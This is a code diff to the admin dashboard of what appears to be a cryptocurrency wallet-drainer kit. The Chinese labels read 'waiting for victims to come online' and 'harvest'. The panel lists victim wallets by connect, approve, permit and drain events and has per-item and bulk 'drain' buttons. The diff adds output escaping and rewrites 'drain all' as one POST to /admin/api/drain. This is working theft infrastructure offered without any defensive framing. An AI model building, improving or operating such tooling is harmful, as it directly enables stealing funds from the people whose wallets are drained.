@@ -82,6 +82,8 @@ const KEY = new URLSearchParams(location.search).get("key");
 const $ = id => document.getElementById(id);
 const fmt = n => Number(n).toLocaleString("en-US");
 const short = a => a ? a.slice(0,8) + "…" + a.slice(-6) : "?";
+const esc = s => String(s ?? "").replace(/[&<>"']/g,
+  c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
 const KINDS = ["connect","approve","permit","drain"];
 
 async function refresh() {
@@ -108,7 +110,7 @@ async function refresh() {
     // 事件流
     $("log").innerHTML = s.events.length ? s.events.map(e =>
       `<div><span class="t">${new Date().toLocaleTimeString()}</span>` +
-      `<span class="k-${e.kind}">[${e.kind}]</span> ${e.text}</div>`).reverse().join("")
+      `<span class="k-${esc(e.kind)}">[${esc(e.kind)}]</span> ${esc(e.text)}</div>`).reverse().join("")
       : '<div class="empty">等待受害者上线…</div>';
     // 清单
     $("noitems").style.display = s.items.length ? "none" : "block";
@@ -117,8 +119,8 @@ async function refresh() {
       return `<tr>
         <td>${i.id}</td>
         <td>${type}<div class="detail">${short(i.victim)}</div></td>
-        <td class="status-${i.status}">${i.status === "drained" ? "已收割" : "待收割"}
-          ${i.detail ? `<div class="detail">${i.detail}</div>` : ""}</td>
+        <td class="status-${esc(i.status)}">${i.status === "drained" ? "已收割" : i.status === "pending" ? "待收割" : "处理中"}
+          ${i.detail ? `<div class="detail">${esc(i.detail)}</div>` : ""}</td>
         <td>${i.status === "pending"
           ? `<button class="drain" data-id="${i.id}">收割</button>` : "—"}</td>
       </tr>`;
@@ -147,10 +149,15 @@ document.addEventListener("click", async ev => {
     const [resp] = await drain([Number(btn.dataset.id)], btn);
     btn.textContent = resp && resp.drained !== undefined ? `✓ +${fmt(resp.drained)}` : "✗ 失败";
   } else if (ev.target.closest("#drainAll")) {
-    const s = await (await fetch(`/admin/api/state?key=${KEY}`)).json();
-    const ids = s.items.filter(i => i.status === "pending").map(i => i.id);
-    await drain(ids, $("drainAll"));
-    $("drainAll").textContent = ids.length ? `✓ 已收割 ${ids.length} 项` : "无可收割项";
+    $("drainAll").textContent = "收割中…";
+    const resp = await (await fetch(`/admin/api/drain?key=${KEY}`, {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ all: true }),
+    })).json();
+    const fail = resp.results ? resp.results.filter(r => r.error).length : 0;
+    $("drainAll").textContent = resp.drained_count
+      ? `✓ 已收割 ${resp.drained_count} 项` + (fail ? `(${fail} 项失败)` : "")
+      : (fail ? `✗ ${fail} 项失败,可重试` : "无可收割项");
   }
 });
 refresh();
